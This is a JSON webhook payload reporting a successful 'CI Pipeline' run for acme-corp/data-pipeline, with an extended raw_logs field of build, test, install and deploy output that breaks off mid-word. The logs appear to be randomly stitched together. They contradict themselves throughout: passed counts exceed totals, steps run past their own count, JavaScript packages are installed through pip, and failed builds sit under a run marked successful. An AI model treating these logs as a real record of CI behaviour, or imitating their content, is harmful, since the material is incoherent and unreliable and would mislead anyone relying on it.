{
  "action": "completed",
  "workflow_run": {
    "id": 597,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "ea9656e6349b3515659b1a35da49023e9bf063b1",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-22T12:19:19.085802Z",
    "updated_at": "2025-11-22T12:21:43.003743Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "frank"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nFetching submodules...\nStep 6/25: Installing dependencies\nCoverage: 77% statements, 77% branches\nnpm install: resolved 1674 packages\nSwitched to branch 'bugfix/task-480'\nPOST /upload - 200 (372ms)\nCompleted.\nWaiting...\nArtifact downloaded: 34MB\nChecking out develop branch\nConnecting to startup.dev:443...\nnpm notice: package.json updated\nOK\nCompiling components/index.js...\nSnapshots: 42 passed, 38 total\nTests: 287 passed, 463 total\nConnection established\n[12:19:19] INFO: Connecting to database\nInstalling axios@2.8.6\nTest Suites: 30 passed, 10 total\n[12:19:19] DEBUG: Initializing service\nCache restored successfully (300MB)\nCompiling utils/handler.rs...\nVerifying...\npip: Collecting jest\nWARNING: webpack has known vulnerabilities\n\u2717 build failed with exit code 99\nCompiling utils/service.java...\nInstalling lodash@3.7.5\nAlready up to date.\nCompleted.\nNODE_ENV=development\n\u2713 lint completed\n[12:19:19] INFO: Connecting to database\n[12:19:19] INFO: Starting build process\nUsing Node.js 17.15.5\nReady.\nWARNING: lodash has known vulnerabilities\n[12:19:19] DEBUG: Query executed in 67ms\n[12:19:19] DEBUG: Query executed in 56ms\nOptimizing 36 modules...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLayer 6/15: COPY command\nPlatform: linux-x64\nFetching submodules...\nSwitched to branch 'hotfix/task-502'\nMinifying app.js\nGET /status - 200 (43ms)\nSwitched to branch 'feature/task-940'\nGenerating source maps...\n[12:19:19] DEBUG: Connection pool: 19 active\n[12:19:19] WARN: Deprecated API usage\nCoverage: 70% statements, 73% branches\nWARNING: lodash has known vulnerabilities\nConnection established\n[12:19:19] WARN: Deprecated API usage\nFetching submodules...\npip: Collecting express\nCreating production build...\nFAILED: test_db_connect\nChecking out develop branch\nStep 1/22: Deploying\nRan 73 tests in 40s\nStep 6/19: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTest Suites: 16 passed, 14 total\n[12:19:19] INFO: Starting build process\nConnecting to startup.dev:443...\nBuilding Docker image...\n[12:19:19] DEBUG: Initializing service\nHEAD is now at 5cca49a\npip: Collecting webpack\npip install: Successfully installed react-5.16\n[12:19:19] INFO: Processing request\nStep 5/16: Installing dependencies\nStep 15/25: Deploying\nWaiting...\nStep 8/16: Deploying\n[12:19:19] INFO: Request completed\nPlatform: darwin-arm64\n[12:19:19] DEBUG: Initializing service\nWARNING: eslint has known vulnerabilities\nTransforming 933 files...\nStep 19/22: Building\nPOST /upload - 200 (221ms)\nNODE_ENV=test\n[12:19:19] DEBUG: Loading configuration\nGenerating source maps...\nInstalling webpack@3.8.1\n[12:19:19] WARN: Deprecated API usage\nArtifact downloaded: 32MB\nHEAD is now at 4e0c5fd\n[12:19:19] DEBUG: Query executed in 79ms\nCache saved successfully\nCompiling lib/utils.go...\nNODE_ENV=development\n[12:19:19] INFO: Cache refreshed\nChecking out main branch\nCache restored successfully (470MB)\n[12:19:19] INFO: Cache refreshed\nTime: 109.292s\nTime: 118.580s\n[12:19:19] WARN: Deprecated API usage\nnpm install: added 114 packages\nUsing Node.js 16.1.9\nStep 2/15: Linting\nFAILED: test_api_health\nyarn add: Done in 20.82s\n\u2713 All checks passed\nTests: 359 passed, 500 total\nCompiling components/service.java...\nCache hit for key-3996\n[12:19:19] INFO: Starting build process\nConnecting to startup.dev:443...\nStep 11/22: Deploying\nWARNING: axios has known vulnerabilities\npip: Collecting webpack\nArtifact uploaded: build.tar.gz (17MB)\npip: Downloading eslint-3.11.tar.gz\n[12:19:19] INFO: Request completed\nProcessing...\npip: Downloading webpack-1.14.tar.gz\nBundling vendor.js\nStep 16/19: Linting\nSnapshots: 4 passed, 21 total\nEnvironment: staging\nStep 18/17: Linting\nConnection established\nCreating production build...\nHEAD is now at e0b0f0c\n[12:19:19] INFO: Processing request\nStep 15/16: Linting\nTransforming 666 files...\nTime: 90.342s\nUsing Node.js 17.14.2\nCache miss for key-7664\nConnecting to cloud.services:443...\nArtifact downloaded: 24MB\nStep 16/23: Building\nRan 164 tests in 49s\nCache hit for key-8644\nStep 15/22: Installing dependencies\nCache miss for key-6026\nCompiling lib/utils.go...\n[12:19:19] WARN: Deprecated API usage\n=== Step deploy_staging completed ===\n=== Step: build ===\nPOST /data - 200 (250ms)\nGenerating source maps...\nStep 17/23: Building\n[12:19:19] INFO: Starting build process\nCompiling src/utils.go...\n[12:19:19] INFO: Starting build process\nInstalling jest@4.2.9\n[12:19:19] DEBUG: Query executed in 94ms\nnpm install: resolved 916 packages\nSuccess!\nUsing Node.js 17.16.1\nWARNING: express has known vulnerabilities\nnpm install: resolved 1603 packages\nMinifying vendor.js\nArtifact uploaded: build.tar.gz (1MB)\n[12:19:19] INFO: Request completed\nConnecting to example.com:443...\nUsing Node.js 17.9.10\nReady.\nCache hit for key-2830\nWaiting...\nCompiling components/utils.go...\n[12:19:19] INFO: Processing request\npip: Collecting prettier\n[12:19:19] INFO: Request completed\nWARNING: axios has known vulnerabilities\nChecking out master branch\nCache hit for key-8618\nNODE_ENV=test\nnpm notice: created a lockfile\n[12:19:19] WARN: Deprecated API usage\nOptimizing 45 modules...\nSwitched to branch 'feature/task-332'\nPlatform: darwin-arm64\nOptimizing 14 modules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nTime: 56.333s\nLayer 8/8: RUN command\nCompiling src/service.java...\nCompiling utils/utils.go...\nNODE_ENV=test\nReady.\n[12:19:19] INFO: Processing request\nOK\nCache saved successfully\nSnapshots: 37 passed, 8 total\nPulling image: node:latest\nWARNING: eslint has known vulnerabilities\nSnapshots: 47 passed, 31 total\nRan 189 tests in 8s\nSwitched to branch 'hotfix/task-662'\n[12:19:19] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (46MB)\nCompleted.\nnpm install: resolved 1227 packages\nArtifact uploaded: dist.zip (95MB)\nStep 5/23: Linting\nAlready up to date.\npip install: Successfully installed react-4.12\nArtifact downloaded: 44MB\nSnapshots: 49 passed, 38 total\nCache invalidated: dependencies\nStep 20/25: Testing\nEnvironment: production\nChecking out main branch\n  PASS: test_cache_hit (191ms)\nBuilding Docker image...\n\u2713 Task completed in 3652ms\nUsing Python 3.9\nCompiling src/main.py...\nUsing Python 3.10\nArtifact uploaded: build.tar.gz (47MB)\n[12:19:19] DEBUG: Initializing service\npip: Collecting jest\n[12:19:19] WARN: Deprecated API usage\n[12:19:19] DEBUG: Memory usage: 1563MB\nArtifact downloaded: 44MB\nAlready up to date.\n[12:19:19] ERROR: Connection failed\nOptimizing 36 modules...\n[12:19:19] INFO: Cache refreshed\n[12:19:19] WARN: Deprecated API usage\n[12:19:19] INFO: Starting build process\n[12:19:19] WARN: Deprecated API usage\nStep 13/15: Installing dependencies\nGET /status - 200 (54ms)\nCache hit for key-5879\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:19:19] INFO: Connecting to database\nOptimizing 86 modules...\n[12:19:19] INFO: Cache refreshed\nFinished.\nCache miss for key-5982\nnpm notice: package.json updated\npip: Installing build dependencies...\nTest Suites: 21 passed, 11 total\nVerifying...\nStep 20/25: Building\nTests: 258 passed, 264 total\n[12:19:19] DEBUG: Query executed in 3ms\nImage pulled successfully\nUsing Node.js 20.15.0\nOK\npip: Installing build dependencies...\n[12:19:19] ERROR: Connection failed\nHEAD is now at 8dc3937\nStep 6/21: Installing dependencies\nWARNING: prettier has known vulnerabilities\nOK\nArtifact uploaded: dist.zip (41MB)\nEnvironment: staging\nLoading...\nProcessing...\nCompiling components/service.java...\nCompiling src/utils.go...\nSuccess!\nLayer 10/8: ENV command\nTransforming 406 files...\nChecking out master branch\nWARNING: lodash has known vulnerabilities\n[12:19:19] INFO: Processing request\nTransforming 183 files...\nWaiting...\nGenerating source maps...\npip: Downloading lodash-1.20.tar.gz\nStep 12/18: Running migrations\nPlatform: win32-x64\nTime: 28.482s\nProcessing...\nChecking out develop branch\n[12:19:19] INFO: Request completed\nStep 11/24: Building\n[12:19:19] WARN: Deprecated API usage\nNODE_ENV=development\nUploading artifact 'build' (44 files)\nStep 20/24: Linting\nUploading artifact 'build' (15 files)\nOptimizing 70 modules...\nWARNING: react has known vulnerabilities\nFAILED: test_db_connect\npip: Installing build dependencies...\n[12:19:19] DEBUG: Memory usage: 804MB\nMinifying app.js\nCache invalidated: build\n\u2713 Step 'test' succeeded\n=== Step build completed ===\n=== Step: upload_artifacts ===\nGET /health - 201 (43ms)\nCreating production build...\nTransforming 156 files...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (14MB)\nyarn add: Done in 8.85s\nCompiling lib/service.java...\nPulling image: alpine:18\nUploading artifact 'build' (35 files)\nNODE_ENV=production\nnpm install: resolved 493 packages\nStep 4/15: Linting\nGET /api - 204 (93ms)\nReady.\nnpm install: resolved 1507 packages\nProcessing...\nnpm install: added 131 packages\nOptimizing 95 modules...\nStep 18/24: Deploying\nProcessing...\nyarn add: Done in 9.71s\n[12:19:19] INFO: Cache refreshed\nArtifact uploaded: dist.zip (52MB)\n[12:19:19] DEBUG: Initializing service\nArtifact uploaded: build.tar.gz (45MB)\nFinished.\n[12:19:19] WARN: Deprecated API usage\nBuilding Docker image...\nProcessing...\nOptimizing 44 modules...\nGET /health - 201 (43ms)\n  PASS: test_api_health (69ms)\n\u2717 build failed with exit code 35\n  PASS: integration/test_api_health.spec.js\nCache restored successfully (201MB)\nDone.\nTime: 114.345s\n[12:19:19] INFO: Starting build process\n[12:19:19] DEBUG: Loading configuration\nSwitched to branch 'hotfix/task-208'\n[12:19:19] DEBUG: Initializing service\nReady.\nBuilding Docker image...\nStep 6/23: Deploying\nRan 152 tests in 8s\nSnapshots: 13 passed, 18 total\nHEAD is now at 2ee8e6d\nnpm install: added 234 packages\nUsing Python 3.10\nGET /status - 201 (25ms)\n  PASS: integration/test_db_connect.spec.js\n[12:19:19] INFO: Request completed\nCache restored successfully (479MB)\nEnvironment: development\nWARNING: axios has known vulnerabilities\nPOST /api - 200 (96ms)\nCache hit for key-1524\nReady.\nArtifact uploaded: dist.zip (27MB)\nWARNING: prettier has known vulnerabilities\nnpm notice: package.json updated\nConnection established\nUploading artifact 'coverage' (20 files)\npip: Collecting axios\nPushing to registry...\nTests: 96 passed, 380 total\nCompleted.\nnpm install: resolved 280 packages\nHEAD is now at 7d8eed6\nConnection established\nArtifact uploaded: dist.zip (84MB)\nException: ValueError\nnpm notice: created a lockfile\npip install: Successfully installed lodash-4.18\npip install: Successfully installed lodash-2.1\n  PASS: test_db_connect (178ms)\nSwitched to branch 'hotfix/task-314'\nCache restored successfully (14MB)\n[12:19:19] INFO: Starting build process\npip: Downloading react-5.3.tar.gz\n  PASS: e2e/test_db_connect.spec.js\nException: RuntimeError\nStep 5/21: Installing dependencies\n\u2713 lint completed\n[12:19:19] INFO: Cache refreshed\nnpm install: resolved 1244 packages\nVerifying...\n\u2713 Step 'checkout' succeeded\nArtifact downloaded: 32MB\nArtifact downloaded: 10MB\nException: RuntimeError\nGenerating source maps...\npip: Collecting jest\nCache saved successfully\nGenerating source maps...\nSuccess!\n[12:19:19] WARN: Deprecated API usage\nProcessing...\nFinished.\n[12:19:19] INFO: Cache refreshed\nWaiting...\nCache hit for key-2203\nCompleted.\nPOST /data - 200 (260ms)\nPlatform: linux-x64\nCache hit for key-4652\n[12:19:19] INFO: Cache refreshed\nStep 4/17: Installing dependencies\npip: Collecting eslint\nnpm install: added 360 packages\nStep 16/16: Installing dependencies\n[12:19:19] INFO: Request completed\nyarn add: Done in 25.92s\nWARNING: react has known vulnerabilities\nPulling image: python:18\nStep 10/22: Running migrations\nnpm notice: created a lockfile\nCache hit for key-7797\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFinished.\n\u2713 Task completed in 2929ms\nNODE_ENV=development\nWARNING: lodash has known vulnerabilities\n[12:19:19] DEBUG: Loading configuration\nReady.\n[12:19:19] WARN: Deprecated API usage\nStep 7/23: Running migrations\nnpm install: added 397 packages\n[12:19:19] INFO: Connecting to database\nTests: 124 passed, 270 total\n  PASS: integration/test_user_create.spec.js\nnpm install: resolved 1497 packages\nCompiling components/handler.rs...\nnpm notice: created a lockfile\nWARNING: prettier has known vulnerabilities\nStep 5/16: Running migrations\nCompleted.\n[12:19:19] INFO: Request completed\nTest Suites: 20 passed, 25 total\nEnvironment: development\nCompiling lib/utils.go...\nArtifact uploaded: build.tar.gz (28MB)\n\u2713 deploy completed\nConnecting to acme.corp:443...\nVerifying...\n=== Step upload_artifacts completed ===\n=== Step: setup_environment ===\n\u2713 Task completed in 2750ms\n\u2713 All checks passed\nTest Suites: 50 passed, 30 total\nPushing to registry...\nnpm install: resolved 500 packages\nLayer 10/12: RUN command\nnpm install: added 24 packages\nConnecting to acme.corp:443...\nVerifying...\nLoading...\n[12:19:19] WARN: Deprecated API usage\nGET /health - 200 (56ms)\nFetching submodules...\nStep 19/20: Deploying\nBuilding Docker image...\nnpm install: added 272 packages\nWaiting...\nCreating production build...\nChecking out main branch\nProcessing...\n  PASS: integration/test_api_health.spec.js\n[12:19:19] DEBUG: Initializing service\nCache restored successfully (395MB)\n\u2713 Task completed in 4470ms\n[12:19:19] DEBUG: Loading configuration\nStep 5/24: Running migrations\nBuilding Docker image...\nStep 2/25: Linting\nBuilding Docker image...\nChecking out master branch\nPushing to registry...\nConnecting to example.com:443...\nCompiling utils/utils.go...\nArtifact uploaded: build.tar.gz (32MB)\nOK\nSuccess!\nCreating production build...\nDone.\nRan 17 tests in 56s\n[12:19:19] INFO: Request completed\nPulling image: python:3.11\n[12:19:19] DEBUG: Connection pool: 20 active\nStep 20/23: Installing dependencies\nCache invalidated: build\nSuccess!\nSuccess!\nImage pulled successfully\nStep 4/19: Linting\nnpm notice: package.json updated\nFinished.\nTransforming 325 files...\n[12:19:19] DEBUG: Loading configuration\n[12:19:19] INFO: Starting build process\n[12:19:19] DEBUG: Connection pool: 6 active\nUsing Node.js 14.19.10\nCompiling src/handler.rs...\nTests: 124 passed, 78 total\nConnecting to cloud.services:443...\nnpm notice: package.json updated\nBuilding Docker image...\nPulling image: node:3.11\nFAILED: test_user_create\nVerifying...\nnpm install: added 250 packages\n\u2713 All checks passed\nUsing Python 3.11\n\u2713 Step 'setup' succeeded\n  PASS: integration/test_cache_hit.spec.js\nSuccess!\nCache hit for key-9232\nTransforming 891 files...\n\u2713 Task completed in 3773ms\n\u2713 Task completed in 1100ms\nTime: 86.507s\n[12:19:19] WARN: Deprecated API usage\nCompiling components/main.py...\nSuccess!\nOK\n[12:19:19] WARN: Deprecated API usage\n[12:19:19] INFO: Cache refreshed\nPulling image: node:3.11\n[12:19:19] DEBUG: Memory usage: 755MB\nRan 74 tests in 58s\n\u2713 Task completed in 2028ms\nFinished.\nSnapshots: 35 passed, 31 total\n[12:19:19] INFO: Cache refreshed\nHEAD is now at 4bb7ad1\nMinifying app.js\nGET /api - 200 (24ms)\n\u2713 Task completed in 4531ms\nCache restored successfully (409MB)\nBuilding Docker image...\n[12:19:19] WARN: Deprecated API usage\n[12:19:19] DEBUG: Query executed in 11ms\nSwitched to branch 'bugfix/task-256'\nRan 84 tests in 16s\nEnvironment: production\nLoading...\nVerifying...\nStep 2/23: Deploying\n[12:19:19] INFO: Starting build process\nFAILED: test_user_create\nCreating production build...\nUsing Python 3.12\nNODE_ENV=development\nPushing to registry...\nCache hit for key-6870\nnpm install: added 23 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:19] DEBUG: Query executed in 54ms\nCache saved successfully\n[12:19:19] DEBUG: Initializing service\nBuilding Docker image...\nAlready up to date.\n[12:19:19] INFO: Request completed\nCoverage: 93% statements, 60% branches\nChecking out develop branch\nCreating production build...\nInstalling lodash@5.14.0\nStep 19/16: Running migrations\nTime: 22.889s\nPlatform: darwin-arm64\nVerifying...\nCache restored successfully (485MB)\nnpm install: added 202 packages\nyarn add: Done in 19.2s\nImage pulled successfully\nFinished.\n  PASS: e2e/test_user_create.spec.js\nCreating production build...\nFetching submodules...\n[12:19:19] INFO: Cache refreshed\nPlatform: linux-x64\nLoading...\nArtifact downloaded: 16MB\nGET /status - 204 (45ms)\nCache invalidated: dependencies\n\u2713 validate completed\nReady.\nyarn add: Done in 4.11s\nProcessing...\npip: Collecting jest\npip install: Successfully installed express-2.7\n  PASS: unit/test_api_health.spec.js\n=== Step setup_environment completed ===\n=== Step: setup_node ===\nCache invalidated: node_modules\nStep 9/23: Linting\nCache hit for key-5977\n[12:19:19] DEBUG: Memory usage: 924MB\nnpm install: added 104 packages\nInstalling eslint@1.11.6\nStep 12/25: Running migrations\nSnapshots: 19 passed, 47 total\n[12:19:19] INFO: Processing request\n[12:19:19] INFO: Starting build process\n[12:19:19] DEBUG: Memory usage: 1681MB\nLoading...\n[12:19:19] INFO: Cache refreshed\nSwitched to branch 'feature/task-702'\nnpm install: added 298 packages\nCache miss for key-2902\nGenerating source maps...\nnpm install: added 342 packages\nCompleted.\nCompleted.\nGenerating source maps...\nnpm install: resolved 1625 packages\nWARNING: express has known vulnerabilities\nCache restored successfully (496MB)\nCache miss for key-7746\nBundling main.css\nArtifact uploaded: dist.zip (62MB)\nMinifying main.js\nCreating production build...\nCreating production build...\npip: Downloading prettier-3.20.tar.gz\nAlready up to date.\nStep 11/15: Building\nCreating production build...\nStep 1/24: Linting\nCompiling src/main.py...\nChecking out develop branch\n\u2713 All checks passed\n\u2717 build failed with exit code 113\nUploading artifact 'build' (18 files)\nSnapshots: 13 passed, 34 total\nOK\nGET /status - 201 (73ms)\n[12:19:19] DEBUG: Connection pool: 9 active\nCache saved successfully\nWARNING: webpack has known vulnerabilities\n[12:19:19] INFO: Connecting to database\n[12:19:19] WARN: Deprecated API usage\nChecking out develop branch\nDone.\nCache miss for key-7933\nArtifact uploaded: dist.zip (67MB)\nCache miss for key-5969\nEnvironment: development\n[12:19:19] DEBUG: Loading configuration\nGenerating source maps...\nGET /health - 201 (74ms)\nCreating production build...\nFinished.\nCache miss for key-5536\nImage pulled successfully\nCompiling components/handler.rs...\nArtifact uploaded: build.tar.gz (47MB)\n[12:19:19] DEBUG: Query executed in 68ms\n[12:19:19] INFO: Connecting to database\nLayer 4/15: ENV command\nWARNING: axios has known vulnerabilities\nMinifying vendor.js\nEnvironment: staging\n[12:19:19] DEBUG: Query executed in 12ms\n[12:19:19] WARN: Deprecated API usage\n\u2713 build completed\n\u2713 All checks passed\nVerifying...\nWARNING: lodash has known vulnerabilities\n[12:19:19] INFO: Starting build process\nCache hit for key-4576\nCache hit for key-8467\nWaiting...\nnpm notice: created a lockfile\nCompiling src/utils.go...\nStep 10/18: Running migrations\n[12:19:19] WARN: Deprecated API usage\nGenerating source maps...\nOK\n[12:19:19] INFO: Request completed\npip: Installing build dependencies...\nnpm notice: package.json updated\nLoading...\nCoverage: 89% statements, 89% branches\n[12:19:19] DEBUG: Memory usage: 639MB\nyarn add: Done in 6.7s\n[12:19:19] WARN: Deprecated API usage\n[12:19:19] WARN: Deprecated API usage\nGenerating source maps...\nCache hit for key-5733\nTLS handshake completed\nFAILED: test_db_connect\nPushing to registry...\nFAILED: test_cache_hit\nPulling image: alpine:3.11\nCache invalidated: dependencies\nFAILED: test_auth_login\nGET /health - 204 (99ms)\nChecking out master branch\n[12:19:19] INFO: Starting build process\nPushing to registry...\npip install: Successfully installed prettier-2.2\npip install: Successfully installed jest-4.6\npip: Downloading lodash-3.19.tar.gz\nFAILED: test_auth_login\n[12:19:19] INFO: Cache refreshed\npip: Downloading jest-3.18.tar.gz\npip: Installing build dependencies...\nPOST /upload - 200 (370ms)\nStep 14/21: Linting\nChecking out develop branch\n\u2713 Step 'install' succeeded\n[12:19:19] INFO: Cache refreshed\nEnvironment: test\nnpm install: resolved 471 packages\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-5694\npip install: Successfully installed express-3.11\n[12:19:19] INFO: Connecting to database\nArtifact uploaded: build.tar.gz (49MB)\nSnapshots: 14 passed, 45 total\nnpm notice: created a lockfile\nyarn add: Done in 17.27s\nTLS handshake completed\nProcessing...\nImage pulled successfully\nUsing Node.js 19.17.7\n[12:19:19] DEBUG: Query executed in 99ms\nnpm notice: created a lockfile\nTime: 115.200s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCreating production build...\nChecking out master branch\nCache miss for key-5802\nWARNING: eslint has known vulnerabilities\nFinished.\n\u2713 All checks passed\nTests: 76 passed, 150 total\n=== Step setup_node completed ===\n=== Step: lint ===\nLoading...\nLoading...\nPushing to registry...\nnpm install: added 321 packages\n  PASS: test_db_connect (17ms)\nSuccess!\nCompiling src/handler.rs...\n[12:19:19] WARN: Deprecated API usage\nLayer 3/8: COPY command\n\u2713 All checks passed\n[12:19:19] INFO: Processing request\n[12:19:19] INFO: Cache refreshed\nInstalling react@5.14.1\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTime: 26.904s\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nWaiting...\n[12:19:19] INFO: Cache refreshed\nnpm notice: package.json updated\n[12:19:19] INFO: Starting build process\nnpm install: added 416 packages\nBuilding Docker image...\nGenerating source maps...\nCompiling src/handler.rs...\n[12:19:19] DEBUG: Memory usage: 1750MB\nUsing Node.js 19.2.7\nPOST /data - 202 (176ms)\nnpm notice: created a lockfile\nCompleted.\nWARNING: webpack has known vulnerabilities\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache invalidated: build\nOK\nGET /api - 201 (35ms)\n[12:19:19] DEBUG: Connection pool: 5 active\nWARNING: lodash has known vulnerabilities\nAlready up to date.\nFetching submodules...\nStep 12/24: Running migrations\nFAILED: test_cache_hit\nCache hit for key-4483\nHEAD is now at 6837660\npip: Installing build dependencies...\nWARNING: eslint has known vulnerabilities\nPushing to registry...\nPulling image: node:3.11\nCompiling src/service.java...\nCache restored successfully (196MB)\n[12:19:19] WARN: Deprecated API usage\n[12:19:19] INFO: Starting build process\nLoading...\nRan 52 tests in 43s\npip install: Successfully installed prettier-4.4\npip: Collecting webpack\nArtifact uploaded: build.tar.gz (11MB)\nStep 5/21: Deploying\nCache restored successfully (340MB)\n\u2717 build failed with exit code 42\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Collecting axios\nnpm install: added 433 packages\nOK\n[12:19:19] INFO: Processing request\nConnecting to example.com:443...\nTests: 448 passed, 230 total\nOK\nPlatform: win32-x64\nWARNING: express has known vulnerabilities\nCache invalidated: build\npip: Installing build dependencies...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nUsing Python 3.12\n\u2713 package completed\nTime: 79.621s\nInstalling eslint@4.19.7\nSnapshots: 40 passed, 8 total\n  PASS: test_user_create (108ms)\nTLS handshake completed\n[12:19:19] INFO: Request completed\nRan 17 tests in 41s\n[12:19:19] DEBUG: Connection pool: 8 active\nCache hit for key-6428\nArtifact downloaded: 8MB\nNODE_ENV=production\nWaiting...\nCache invalidated: build\nCompiling utils/handler.rs...\nCompleted.\nOK\nVerifying...\nStep 2/24: Building\n[12:19:19] DEBUG: Query executed in 83ms\nAlready up to date.\nFetching submodules...\nSuccess!\n\u2713 Step 'checkout' succeeded\nCache saved successfully\nFAILED: test_api_health\nOptimizing 10 modules...\nConnection established\nCompiling utils/utils.go...\n\u2713 Step 'test' succeeded\nPlatform: linux-x64\n[12:19:19] INFO: Cache refreshed\n\u2717 build failed with exit code 62\nCache invalidated: dependencies\nWARNING: lodash has known vulnerabilities\nCreating production build...\nDone.\nPulling image: alpine:latest\nPushing to registry...\n\u2717 build failed with exit code 121\nMinifying app.js\nProcessing...\nGenerating source maps...\nGenerating source maps...\npip: Installing build dependencies...\npip: Downloading webpack-2.0.tar.gz\nTransforming 781 files...\nWARNING: express has known vulnerabilities\nWaiting...\nCompiling src/app.ts...\n[12:19:19] INFO: Cache refreshed\n[12:19:19] DEBUG: Query executed in 53ms\nOptimizing 77 modules...\n[12:19:19] INFO: Request completed\nSnapshots: 27 passed, 10 total\nArtifact uploaded: dist.zip (24MB)\n\u2717 build failed with exit code 116\nProcessing...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nWaiting...\nTransforming 301 files...\nTLS handshake completed\n[12:19:19] INFO: Connecting to database\nLoading...\nStep 6/19: Testing\nDone.\nArtifact uploaded: build.tar.gz (42MB)\nOK\nCompiling components/index.js...\nCreating production build...\nPushing to registry...\nCompiling src/handler.rs...\n=== Step lint completed ===\n=== Step: install_dependencies ===\nReady.\nnpm install: resolved 247 packages\n\u2713 All checks passed\nTransforming 474 files...\nCache restored successfully (73MB)\nTLS handshake completed\nTest Suites: 34 passed, 44 total\n[12:19:19] DEBUG: Memory usage: 127MB\nImage pulled successfully\nArtifact uploaded: dist.zip (60MB)\n[12:19:19] WARN: Deprecated API usage\nPulling image: python:3.11\npip install: Successfully installed axios-4.15\nCompiling src/handler.rs...\nOK\nGenerating source maps...\n[12:19:19] WARN: Deprecated API usage\nNODE_ENV=test\nCache hit for key-5478\nnpm notice: package.json updated\nWARNING: axios has known vulnerabilities\nRan 197 tests in 14s\nCache restored successfully (262MB)\nFinished.\n[12:19:19] DEBUG: Query executed in 22ms\nStep 9/23: Deploying\n[12:19:19] DEBUG: Memory usage: 1683MB\n[12:19:19] DEBUG: Query executed in 81ms\n  PASS: test_api_health (224ms)\n[12:19:19] INFO: Connecting to database\nCache miss for key-8337\n\u2713 package completed\nPOST /upload - 200 (497ms)\nProcessing...\n\u2717 build failed with exit code 109\n[12:19:19] WARN: Deprecated API usage\nTests: 349 passed, 66 total\n[12:19:19] DEBUG: Loading configuration\npip: Downloading react-1.11.tar.gz\nCache saved successfully\npip: Installing build dependencies...\nTests: 144 passed, 83 total\n[12:19:19] INFO: Processing request\nWARNING: prettier has known vulnerabilities\npip: Downloading lodash-4.0.tar.gz\nStep 17/24: Building\n[12:19:19] INFO: Request completed\nnpm notice: package.json updated\nTests: 311 passed, 175 total\nEnvironment: test\nCompleted.\nTest Suites: 22 passed, 21 total\nPOST /api - 201 (394ms)\nCache miss for key-4977\npip install: Successfully installed eslint-1.0\n[12:19:19] INFO: Connecting to database\nStep 13/25: Installing dependencies\nCompiling utils/app.ts...\n[12:19:19] INFO: Cache refreshed\nEnvironment: development\n[12:19:19] DEBUG: Query executed in 96ms\n  PASS: e2e/test_user_create.spec.js\n[12:19:19] DEBUG: Initializing service\nLayer 6/12: RUN command\n  PASS: test_user_create (189ms)\n[12:19:19] DEBUG: Initializing service\nException: NullPointerException\nCoverage: 79% statements, 96% branches\nSuccess!\n[12:19:19] DEBUG: Loading configuration\nFetching submodules...\nWaiting...\nAlready up to date.\nGET /health - 201 (37ms)\n  PASS: test_api_health (141ms)\nCompleted.\n\u2713 Step 'setup' succeeded\nyarn add: Done in 28.4s\npip: Downloading axios-5.1.tar.gz\nImage pulled successfully\nConnection established\nOptimizing 61 modules...\nPulling image: node:18\nTLS handshake completed\nnpm install: added 426 packages\n[12:19:19] INFO: Processing request\nBuilding Docker image...\nFAILED: test_user_create\nFetching submodules...\nTLS handshake completed\nUsing Node.js 14.13.1\nMinifying main.js\n  PASS: test_cache_hit (375ms)\nCompleted.\nOK\nArtifact uploaded: build.tar.gz (41MB)\nBuilding Docker image...\nSuccess!\n  PASS: test_cache_hit (149ms)\nProcessing...\nReady.\n\u2713 Task completed in 2182ms\nnpm notice: created a lockfile\nOK\nPushing to registry...\nArtifact uploaded: build.tar.gz (9MB)\nnpm notice: package.json updated\nCache saved successfully\n[12:19:19] INFO: Cache refreshed\nCache miss for key-9370\nCompiling components/handler.rs...\nFinished.\n  PASS: integration/test_api_health.spec.js\n[12:19:19] DEBUG: Loading configuration\n[12:19:19] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (12MB)\nRan 119 tests in 21s\nStep 16/24: Building\n\u2717 build failed with exit code 74\nChecking out main branch\n[12:19:19] DEBUG: Connection pool: 20 active\nArtifact uploaded: dist.zip (66MB)\nOK\nImage pulled successfully\n[12:19:19] DEBUG: Query executed in 43ms\nLayer 3/10: COPY command\n\u2713 package completed\nImage pulled successfully\nGET /health - 204 (34ms)\nCompleted.\nTests: 329 passed, 403 total\nReady.\nGenerating source maps...\nFetching submodules...\nInstalling eslint@4.7.6\n  PASS: test_cache_hit (37ms)\nReady.\nSwitched to branch 'feature/task-956'\n\u2717 build failed with exit code 25\nAlready up to date.\nMinifying main.js\nSnapshots: 48 passed, 4 total\nConnecting to example.com:443...\n  PASS: integration/test_auth_login.spec.js\nPulling image: node:18\n=== Step install_dependencies completed ===\n=== Step: e2e_tests ===\nCache miss for key-8063\n\u2713 All checks passed\nImage pulled successfully\nConnection established\n  PASS: test_cache_hit (292ms)\nHEAD is now at df63f3a\npip install: Successfully installed eslint-2.11\nnpm install: resolved 1029 packages\nVerifying...\n\u2713 Step 'test' succeeded\nConnection established\nOptimizing 39 modules...\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPushing to registry...\nnpm notice: created a lockfile\nArtifact uploaded: build.tar.gz (19MB)\nCache invalidated: node_modules\n[12:19:19] INFO: Connecting to database\nCompiling utils/app.ts...\n[12:19:19] INFO: Processing request\nFAILED: test_cache_hit\n[12:19:19] DEBUG: Memory usage: 308MB\nTransforming 289 files...\n[12:19:19] INFO: Request completed\nAlready 